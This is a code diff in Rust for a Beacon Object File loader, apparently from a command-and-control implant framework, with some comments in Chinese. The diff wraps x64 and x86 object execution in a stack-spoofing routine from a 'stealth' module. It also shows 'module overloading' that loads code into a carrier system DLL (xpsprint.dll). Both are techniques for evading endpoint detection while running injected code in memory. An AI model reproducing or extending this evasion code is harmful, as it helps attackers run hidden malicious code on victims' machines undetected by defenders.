@@ -134,25 +134,27 @@ impl BofLoader {
             )?;
         }
 
-        // 检测架构并调用相应的执行函数
-        let machine = header.machine; // 复制字段以避免 packed struct 对齐问题
+        // High-risk path: default stack spoof around map/protect/execute (sync bodies).
+        let machine = header.machine;
         match machine {
             IMAGE_FILE_MACHINE_AMD64 => {
                 info!("[*] Detected x64 BOF");
-                Self::execute_x64(coff_data, args, &header).await
+                crate::stealth::stack::with_spoofed_stack(|| {
+                    Self::execute_x64_sync(coff_data, args, &header)
+                })
             }
             IMAGE_FILE_MACHINE_I386 => {
                 info!("[*] Detected x86 BOF");
-                Self::execute_x86(coff_data, args, &header).await
+                crate::stealth::stack::with_spoofed_stack(|| {
+                    Self::execute_x86_sync(coff_data, args, &header)
+                })
             }
-            _ => {
-                Err(BofError::UnsupportedArchitecture(machine))
-            }
+            _ => Err(BofError::UnsupportedArchitecture(machine)),
         }
     }
 
-    /// 执行 x64 BOF
-    async fn execute_x64(coff_data: &[u8], args: &[u8], header: &CoffFileHeader) -> BofResult<String> {
+    /// 执行 x64 BOF（同步；由 execute 外包 stack spoof）
+    fn execute_x64_sync(coff_data: &[u8], args: &[u8], header: &CoffFileHeader) -> BofResult<String> {
         unsafe {
             // 1. 实现 True Module Overloading: 挑选载体 DLL
             let carrier_dll = "\\??\\C:\\Windows\\System32\\xpsprint.dll";
@@ -334,7 +336,7 @@ impl BofLoader {
     }
 
     /// 执行 x86 BOF (32位)
-    async fn execute_x86(_coff_data: &[u8], _args: &[u8], _header: &CoffFileHeader) -> BofResult<String> {
+    fn execute_x86_sync(_coff_data: &[u8], _args: &[u8], _header: &CoffFileHeader) -> BofResult<String> {
         #[cfg(target_arch = "x86_64")]
         {
             return Err(BofError::architecture_mismatch("x86", "x64"));
